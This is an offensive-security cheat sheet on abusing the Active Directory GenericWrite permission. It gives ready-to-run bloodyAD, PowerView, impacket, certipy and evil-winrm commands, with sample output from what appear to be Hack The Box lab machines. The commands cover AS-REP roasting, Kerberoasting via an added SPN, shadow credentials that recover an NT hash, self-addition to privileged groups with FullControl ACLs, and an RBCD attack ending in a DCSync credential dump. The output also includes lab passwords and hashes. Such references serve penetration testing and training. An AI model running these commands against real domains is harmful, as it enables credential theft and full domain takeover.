---
title: "GenericWrite"
date: 2024-7-13
tags: ["Shadow Credentials", "Pass-The-Ticket", "Kerberoasting", "Genericwrite", "Powerview", "Asreproast", "Credential Dumping", "Ticket Granting Ticket", "Active Directory", "Windows"]
---

### Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# Enable Account (if Disabled)
sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k remove uac <TARGET_USER> -f ACCOUNTDISABLE
```

```console
sudo ntpdate -s <DC_IP> && bloodyAD --host <DC> -d "<DOMAIN>" --dc-ip <DC_IP> -k add uac <TARGET_USER> -f DONT_REQ_PREAUTH
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class="sample-code"}
PS C:\programdata> . .\PowerView.ps1
. .\PowerView.ps1
```

#### 2. Check Target User

```console
Get-DomainUser '<TARGET_USER>' | ConvertFrom-UACValue
```

```console {class="sample-code"}
PS C:\programdata> Get-DomainUser 'user' | ConvertFrom-UACValue
Get-DomainUser 'user' | ConvertFrom-UACValue

Name                           Value                                           
----                           -----                                           
NORMAL_ACCOUNT                 512
```

#### 3. Create a Cred Object (runas) \[Optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 4. Add UF_DONT_REQUIRE_PREAUTH bit

```console
Set-DomainObject -Identity '<TARGET_USER>' -XOR @{useraccountcontrol=4194304} -Verbose -Credential $Cred
```

```console {class="sample-code"}
PS C:\programdata> Set-DomainObject -Identity 'user' -XOR @{useraccountcontrol=4194304} -Verbose  -C
Set-DomainObject -Identity 'user' -XOR @{useraccountcontrol=4194304} -Verbose  -Credential $Cred
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'corp.local' from -Credential
VERBOSE: [Get-DomainSearcher] search base: 
LDAP://DC01.corp.local/DC=corp,DC=local
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: 
(&(|(|(samAccountName=user)(name=user)(displayname=user))))
VERBOSE: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for 
object 'user'
```

#### 5. AS-REP Roasting

```console
# In local linux machine
impacket-GetNPUsers '<DOMAIN>/<TARGET_USER>' -no-pass -dc-ip <DC>
```

```console {class="sample-code"}
$ impacket-GetNPUsers 'corp.local/user' -no-pass -dc-ip 172.16.1.5
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] Getting TGT for user
$krb5asrep$23$user@CORP.LOCAL:642ec7b699 ---[SNIP]--- e70950229f
```

{{< /tabcontent >}}

---

### Abuse #2 : Kerberoasting by Adding SPN

{{< tab set2 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

#### 2. Create a Cred Object (runas) \[Optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add a SPN

```console
# eg. MSSQLSvc/example.com:1433
setspn -a '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' '<DOMAIN>\<TARGET_USER>'
```

```console
# Check
Get-DomainUser '<TARGET_USER>' | Select serviceprincipalname
```

#### 4. Get the SPN

```console
Get-DomainSPNTicket -SPN '<SERVICE>/<TARGET_DOMAIN>:<SERVICE_PORT>' -Credential $Cred
```

{{< /tabcontent >}}

---

### Abuse #3: Add Shadow Credentials

{{< tab set3 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 1. Request a ticket

```console
sudo ntpdate -s <DC> && impacket-getTGT '<DOMAIN>/<USER>' -dc-ip <DC_IP>
```

```console {class="sample-code"}
$ sudo ntpdate -s dc.absolute.htb && impacket-getTGT 'absolute.htb/m.lovegod'
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Saving ticket in m.lovegod.ccache
```

#### 2. Add Shadow Credentials

```console
export KRB5CCNAME=<USER>.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=m.lovegod.ccache
```

```console
# Pre-check (Optional)
certipy-ad find -username '<USER>@<DOMAIN>' -k -target <TARGET_DOMAIN>
```

```console {class="sample-code"}
$ certipy-ad find -username 'm.lovegod@absolute.htb' -k -target dc.absolute.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'absolute-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'absolute-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'absolute-DC-CA' via RRP
[*] Got CA configuration for 'absolute-DC-CA'
[*] Saved BloodHound data to '20240924045839_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20240924045839_Certipy.txt'
[*] Saved JSON output to '20240924045839_Certipy.json'
```

```console
# Add shadow credentials
certipy-ad shadow auto -username '<USER>@<DOMAIN>' -account <TARGET_USER> -k -target <TARGET_DOMAIN>
```

```console {class="sample-code"}
$ certipy-ad shadow auto -username 'm.lovegod@absolute.htb' -account winrm_user -k -target dc.absolute.htb       
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_user'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee'
[*] Adding Key Credential with device ID '8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee' to the Key Credentials for 'winrm_user'
[*] Successfully added Key Credential with device ID '8b5c2efa-83aa-4f27-d9c7-bc95a9eb1fee' to the Key Credentials for 'winrm_user'
[*] Authenticating as 'winrm_user' with the certificate
[*] Using principal: winrm_user@absolute.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_user.ccache'
[*] Trying to retrieve NT hash for 'winrm_user'
[*] Restoring the old Key Credentials for 'winrm_user'
[*] Successfully restored the old Key Credentials for 'winrm_user'
[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
```

#### FIX: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)

```console
# No really a fix, need to runas administrator
gpupdate /force
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Administrator\Documents> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

#### 3. Remote

```console
# Edit '/etc/krb5.conf' (All uppercase)
[libdefaults]
    default_realm = <DOMAIN>

[realms]
    <DOMAIN> = {
        kdc = <DC>:88
        admin_server = <DC>
        default_domain = <DOMAIN>
    }
    
[domain_realm]
    .domain.internal = <DOMAIN>
    domain.internal = <DOMAIN>
```

```console {class="sample-code"}
[libdefaults]
    default_realm = ABSOLUTE.HTB

[realms]
    ABSOLUTE.HTB = {
        kdc = DC.ABSOLUTE.HTB:88
        admin_server = DC.ABSOLUTE.HTB
        default_domain = ABSOLUTE.HTB
    }
    
[domain_realm]
    .domain.internal = ABSOLUTE.HTB
    domain.internal = ABSOLUTE.HTB
```

<br>

```console
export KRB5CCNAME=<TARGET_USER>.ccache
```

```console {class="sample-code"}
$ export KRB5CCNAME=winrm_user.ccache
```

```console
evil-winrm -i <TARGET_DOMAIN> -r <DOMAIN>
```

```console {class="sample-code"}
$ evil-winrm -i dc.absolute.htb -r absolute.htb
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_user\Documents> 
```

{{< /tabcontent >}}

---

### Abuse #4 : Add Self to Group (From Linux)

{{< tab set4 tab1 >}}bloodyAD{{< /tab >}}
{{< tab set4 tab2 >}}powerview.py{{< /tab >}}
{{< tabcontent set4 tab1 >}}

#### 1. Add Self to Group

```console
# With password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend'
[+] oorend added to SERVICEMGMT
```

```console
# With Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
[+] m.lovegod added to NETWORK AUDIT
```

#### 2. Add GenericAll over Target Group

```console
# With password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```

```console
# With Kerberos
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add genericAll 'NETWORK AUDIT' 'm.lovegod' 
[+] m.lovegod has now GenericAll on NETWORK AUDIT
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< tabcontent set4 tab2 >}}

#### 1. Connect

```console
sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.rebound.htb && powerview 'rebound.htb/oorend:1GR8t@$$4u@dc01.rebound.htb'
Logging directory is set to /home/kali/.powerview/logs/dc01.rebound.htb
[2024-09-24 07:11:06] Channel binding is enforced!
(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]
PV > 
```

#### 2. Add Self to Group

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'
```

```console {class="sample-code"}
PV > Add-DomainGroupMember -Identity 'servicemgmt' -Members 'oorend'
[2024-09-24 07:13:17] User oorend successfully added to servicemgmt
```

```console
# Check
Get-DomainGroupMember -Identity '<GROUP>'
```

```console {class="sample-code"}
PV > Get-DomainGroupMember -Identity 'servicemgmt'
GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : ppaul
MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951

---[SNIP]---

GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : oorend
MemberDistinguishedName     : CN=oorend,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
```

#### 4. Add Fullcontrol over Target Group

```console
# Exit and login again to apply changes
Add-DomainObjectAcl -TargetIdentity '<TARGET_GROUP>' -PrincipalIdentity '<USER>' -Rights fullcontrol
```

```console {class="sample-code"}
PV > Add-DomainObjectAcl -TargetIdentity 'service users' -PrincipalIdentity 'oorend' -Rights fullcontrol
[2024-09-24 07:37:24] [Add-DomainObjectACL] Found target identity: OU=Service Users,DC=rebound,DC=htb
[2024-09-24 07:37:24] [Add-DomainObjectACL] Found principal identity: CN=oorend,CN=Users,DC=rebound,DC=htb
[2024-09-24 07:37:24] Adding FullControl to OU=Service Users,DC=rebound,DC=htb
[2024-09-24 07:37:24] DACL modified successfully!
```

```console
# Check
Get-DomainObjectAcl -Identity '<TARGET_USER>' -Where 'SecurityIdentifier contains <USER>'
```

```console {class="sample-code"}
PV > Get-DomainObjectAcl -Identity 'winrm_svc' -Where 'SecurityIdentifier contains oorend'
ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
ActiveDirectoryRights       : FullControl
AccessMask                  : 0xf01ff
InheritanceType             : None
SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
```

<small>*Ref: [powerview.py](https://github.com/aniqfakhrul/powerview.py)*</small>

{{< /tabcontent >}}

### Abuse #4 : Add Self to Group (From Windows)

{{< tab set5 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set5 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
```

#### 2. Create a Cred Object (runas) \[Optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add Self to Group

```console
Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>' -Credential $Cred
```

```console {class="sample-code"}
PS C:\programdata> Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
Add-DomainGroupMember -Identity 'security engineers' -Members 'user' -Credential $Cred
```

```console
# Check
Get-DomainGroupMember -Identity '<GROUP>'
```

```console {class="sample-code"}
PS C:\programdata> Get-DomainGroupMember -Identity 'security engineers'
Get-DomainGroupMember -Identity 'security engineers'

---[SNIP]---

GroupDomain             : corp.local
GroupName               : Security Engineers
GroupDistinguishedName  : CN=Security Engineers,CN=Users,DC=corp,DC=local
MemberDomain            : corp.local
MemberName              : user
MemberDistinguishedName : CN=user,OU=Contractors,OU=Corp,DC=corp,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-2291914956-3290296217-2402366952-1114
```

{{< /tabcontent >}}

---

### Abuse #5 : RBCD Attack (GenericWrite over DC)

{{< tab set6 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set6 tab1 >}}

#### 1. RBCD Attack

```console
impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from '<USER>' -dc-ip <DC_IP> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
```

#### 2. Impersonate

```console
impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate <TARGET_USER> -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
```

#### 3. Import Ticket

```console
export KRB5CCNAME='<USER>@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache'
```

#### 4. DCSync Attack

```console
impacket-secretsdump '<USER>@<TARGET_DOMAIN>' -k -no-pass
```

{{< /tabcontent >}}